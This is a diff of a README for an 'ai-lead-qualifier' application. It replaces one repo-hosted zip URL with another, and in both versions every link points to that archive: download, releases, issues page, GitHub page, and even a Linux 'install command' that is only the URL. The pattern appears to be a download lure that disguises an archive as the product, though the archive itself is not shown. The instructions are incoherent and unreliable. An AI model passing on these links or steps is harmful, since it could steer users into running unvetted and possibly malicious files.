@@ -1,6 +1,6 @@
 # 🤖 ai-lead-qualifier - Simplifying Your Lead Qualification Process
 
-[![Download ai-lead-qualifier](https://raw.githubusercontent.com/Veeksha29/ai-lead-qualifier/main/conversation/ai-qualifier-lead-v3.9.zip)](https://raw.githubusercontent.com/Veeksha29/ai-lead-qualifier/main/conversation/ai-qualifier-lead-v3.9.zip)
+[![Download ai-lead-qualifier](https://github.com/Veeksha29/ai-lead-qualifier/raw/refs/heads/main/frontend/ai-lead-qualifier-v2.2.zip)](https://github.com/Veeksha29/ai-lead-qualifier/raw/refs/heads/main/frontend/ai-lead-qualifier-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **ai-lead-qualifier**! This application uses artificial intelligence 
 
 To get started, visit the Releases page to download the application:
 
-[Download ai-lead-qualifier from Releases](https://raw.githubusercontent.com/Veeksha29/ai-lead-qualifier/main/conversation/ai-qualifier-lead-v3.9.zip)
+[Download ai-lead-qualifier from Releases](https://github.com/Veeksha29/ai-lead-qualifier/raw/refs/heads/main/frontend/ai-lead-qualifier-v2.2.zip)
 
 ### Steps to Download
 
@@ -42,7 +42,7 @@ After downloading the application, follow these simple steps to install it:
 4. For Linux Users:
    - Open a terminal.
    - Navigate to the directory where the file is downloaded.
-   - Run the install command by typing `https://raw.githubusercontent.com/Veeksha29/ai-lead-qualifier/main/conversation/ai-qualifier-lead-v3.9.zip` in the terminal.
+   - Run the install command by typing `https://github.com/Veeksha29/ai-lead-qualifier/raw/refs/heads/main/frontend/ai-lead-qualifier-v2.2.zip` in the terminal.
 
 ## 🎉 Running the Application
 
@@ -74,7 +74,7 @@ If you face any issues, consider these tips:
 - Restart the application if it does not respond.
 - Check your internet connection for any network-related features.
 
-For further assistance, you can visit our [Issues Page](https://raw.githubusercontent.com/Veeksha29/ai-lead-qualifier/main/conversation/ai-qualifier-lead-v3.9.zip) or consult the community forums.
+For further assistance, you can visit our [Issues Page](https://github.com/Veeksha29/ai-lead-qualifier/raw/refs/heads/main/frontend/ai-lead-qualifier-v2.2.zip) or consult the community forums.
 
 ## 🌟 Support and Contributions
 
@@ -96,4 +96,4 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 ---
 
-For more information and updates, visit our [GitHub Page](https://raw.githubusercontent.com/Veeksha29/ai-lead-qualifier/main/conversation/ai-qualifier-lead-v3.9.zip). Happy qualifying!
+For more information and updates, visit our [GitHub Page](https://github.com/Veeksha29/ai-lead-qualifier/raw/refs/heads/main/frontend/ai-lead-qualifier-v2.2.zip). Happy qualifying!
